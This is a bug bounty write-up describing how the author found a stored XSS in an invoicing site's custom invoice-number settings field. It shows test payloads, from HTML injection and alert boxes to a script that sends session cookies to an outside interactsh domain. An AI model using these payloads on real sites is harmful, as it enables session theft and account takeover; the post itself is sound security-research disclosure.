Title: How I Found a $250 XSS Bug After Losing Hope in Bug Bounty
Subtitle: Persistence, a settings panel, and a stored XSS that finally paid off
Date: 2025-10-15
Tags: xss, bug bounty
Reward: 250 USD
Banner: images/xss-250-payment.webp

A few months ago, I was done with bug bounty hunting.

I had hunted on so many targets, tested everything from login panels to invoice generators, and every time, it was the same reply:

> "Duplicate. No reward."

Frustrating, right?

So I took a small break. Then one night, I decided to give it one more shot. I opened Google, did a quick dork search, and found a random website. It looked just like any other platform I'd tested before.

But something in me said: let's explore it anyway.

I registered an account and started digging around. The website had tons of functionality, you could create customers, generate invoices, tweak settings, and much more.

At first glance, everything looked perfectly secure. Then I went to the **Settings Panel** because, let's be honest, that's where developers sometimes forget to sanitize inputs 😏

Scrolling through the options, one field caught my attention:

**Custom invoice reference number format**

Underneath it said:

> "An {{increment}} will be replaced by an incrementing integer."

At first, I thought it was just a placeholder thing. I entered `999` but got an error:

> "Custom invoice numbers must have at least {{letter}}, {{number}}, or {{increment}} in them."

So I tried `{{letter}} hello` and it saved!

That's when my hacker instincts kicked in ⚡

I started testing for **SSTI** (Server Side Template Injection), tried payloads like `{{7*7}}` and `${{7*7}}`, but nothing worked.

So I shifted to **HTML injection**.

```
<b>bold</b><i>italic</i><u>underline</u>
```

It worked.

My eyes lit up. 😳

But I knew a simple HTML injection wouldn't make much impact. So I pushed further.

```
<script>alert(1)</script>
```

Boom… a popup appeared. ;)

Now, I knew I had something serious: a **stored XSS** vulnerability.

But instead of reporting it immediately, I wanted to show real impact, because often XSS gets marked as "Medium" severity unless you can prove account takeover.

So I went ahead and tested:

```
<script>alert(document.cookie)</script>
```

It popped my own cookies.

To go a step further, I used:

```
<script>
new Image().src="https://<interactsh-domain>/cookie.php?cookie=" + document.cookie
</script>
```

I was able to steal session cookies and show that attackers could take over other accounts. I wrote a detailed report and sent it to the company. Then I waited. Days turned into weeks and then months with no response. I even messaged the CEO on LinkedIn, but got no reply.

Until one morning, I checked my inbox. There it was, a PayPal email.

> "You've received $250." 💰

That was it. My first bounty after months of rejection.

And that feeling? Totally worth the wait.

Patience really pays off in bug bounty hunting. Even when you feel like quitting, keep going. Because sometimes, that random target you find at 2 AM is the one that changes everything.

💡 **Moral of the story:** Don't give up too early. Keep learning, keep experimenting, and trust the process. Because your $250 moment might just be one payload away. 😄

![PayPal payment of $250 USD received for the XSS report](images/xss-250-payment.webp)

📌 Connect on LinkedIn: [Danish Ahmed](https://www.linkedin.com/in/danish-ahmed-61927b265/) &middot; [Ayesha Attaria](https://www.linkedin.com/in/ayeshaattaria-penetrationtester/)
